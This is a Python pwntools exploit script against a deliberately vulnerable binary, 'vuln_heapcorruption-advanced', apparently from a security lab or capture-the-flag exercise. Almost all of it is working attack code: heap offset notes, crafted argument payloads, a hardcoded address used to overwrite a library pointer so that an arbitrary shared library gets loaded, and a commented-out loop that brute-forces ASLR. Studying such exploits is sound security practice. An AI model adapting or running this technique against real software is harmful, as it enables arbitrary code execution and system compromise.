#!/usr/bin/env python
# -*- coding: utf-8 -*-
from itertools import count

from pwn import *
exe = context.binary = ELF('vuln_heapcorruption-advanced')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
break main
continue
break nss_load_library
continue
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

"""
for x <= size <= y (unknown x, y; from gdb inspection)
the offsets are:
- user_args <-> user.name is 496
- user_args <-> user.library is 488 (other offset minus 8)

the payload consists of: (number of A = ({offset_to_name} - 8 - 4) / 12)
[char count]: input => output
244:  \                  => \x00 + 242*A + ' ' + ' '
243:  'A'*242            => 242*A + ' '
1:    ''                 => ' '
8:    'PTRR123'          => 'PTRR123 '
8+x:  'X/X\' '\' '\' '\' => 'X/X\x00\x00\x00\x00 ' + _ANYTHING_UNTIL_NEXT_STR_TERMINATION_


mappings from input size (as calculated by the program) to offsets
(input size) -> (offset user_args <-> ni.name)
359 -> 400
315 -> 352
287 -> 336
267 -> 304
263 -> 304 # 146*A
227 -> 272
211 -> 256
203 -> 240
195 -> 250 # 114*A
83 -> 128 # 58*A
"""

# TODO: this seems to be not true for the heap, memory layout is changed when upgrading from MEDIUM to ADVANCED, but no ALSR afaik
# this is NOT correct for general ASLR
# but with some luck it is :)
# if modified, make sure it's passed as a single argument by checking argv (ie no spaces/...)
NAME_ADDRESS = 0x5655a1f0
LIBRARY_POINTER = p32(NAME_ADDRESS - 1)

argv = ["'\\'", 'A' * 58, "''", LIBRARY_POINTER +
        b'123', "'X/X\\'", "'\\'", "'\\'", "'\\'", "''"]
#io = start(argv, aslr=False, level=logging.DEBUG)
io = start(argv)
io.wait_for_close()

"""
with log.progress('Brute-forceing ASLR') as p:
    for tries in count(start=1):
        io = start(argv, level=logging.ERROR)
        p.status(f'{tries} tries')
        success = b'Shared library loaded'
        if io.recvuntil(success):
            io.unrecv(success)
            break
        io.kill()
"""

while True:
    try:
        log.info(io.recvlineS())
    except EOFError:
        break